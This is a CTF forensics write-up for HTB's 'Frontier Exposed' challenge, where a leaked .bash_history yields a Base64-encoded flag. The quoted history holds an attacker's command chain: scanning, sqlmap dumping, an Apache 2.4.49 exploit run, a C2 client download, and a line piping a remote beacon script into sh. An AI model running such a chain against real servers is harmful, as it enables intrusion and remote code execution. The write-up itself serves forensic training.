# Frontier Exposed Writeup

### This challenge is the first forensics challenge from the HTB University CTF 2024:Binary Badlands, and categorized as "very easy" in difficulty 

By taking a look at the challenge description, we are able to understand what we are looking for.  
``
The chaos within the Frontier Cluster is relentless, with malicious actors exploiting vulnerabilities to establish footholds across the expanse. During routine surveillance, an open directory vulnerability was identified on a web server, suggesting suspicious activities tied to the Frontier Board. Your mission is to thoroughly investigate the server and determine a strategy to dismantle their infrastructure. Any credentials uncovered during the investigation would prove invaluable in achieving this objective.
``

Essentially, a **Username** and  **Password**.  

Starting off, we are presented with a website that is actually a directory listing. We see 8 choices, lets click on the first one. The file `.bash_history` is downloaded. Let's open it and see whats inside:  
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/HTB%20University%20CTF%202024/forensics/Frontier%20Exposed/images/frontierexposed1.png)

```
nmap -sC -sV nmap_scan_results.txt jackcolt.dev
cat nmap_scan_results.txt
gobuster dir -u http://jackcolt.dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o dirs.txt
nc -zv jackcolt.dev 1-65535
curl -v http://jackcolt.dev
nikto -h http://jackcolt.dev
sqlmap -u "http://jackcolt.dev/login.php" --batch --dump-all
searchsploit apache 2.4.49
wget https://www.exploit-db.com/download/50383 -O exploit.sh
chmod u+x exploit.sh
echo "http://jackcolt.dev" > target.txt
./exploit target.txt /bin/sh whoami
wget https://notthefrontierboard/c2client -O c2client
chmod +x c2client
/c2client --server 'https://notthefrontierboard' --port 4444 --user admin --password SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9
./exploit target.txt /bin/sh 'curl http://notthefrontierboard/files/beacon.sh|sh'
wget https://raw.githubusercontent.com/vulmon/Vulmap/refs/heads/master/Vulmap-Linux/vulmap-linux.py -O vulnmap-linux.py
cp vulnmap-linux.py /var/www/html
```

*Knowing what a `.bash_history` file is gives a significant advantage in this challenge. Searching online,the definition of bash_history is a stored list of all commands a given user has entered into the system*.  

Aha! A set of credentials is presented:
`
--user admin --password SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9
`  

Searching the rest of the directory, we dont find anything truly valuable, although some things can be noted.
The threat actor gathered information about the domain `http://jackcolt.dev`, then searched for an exploit for the web server that hosts the domain, and successfully exploited the vulnerability.

Let's take another look at those credentials. It appears the password is Base64 encoded?!
Lets decode it using [CyberChef](https://gchq.github.io/CyberChef/).
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/HTB%20University%20CTF%202024/forensics/Frontier%20Exposed/images/frontierexposed2.png)  

And we got the flag!

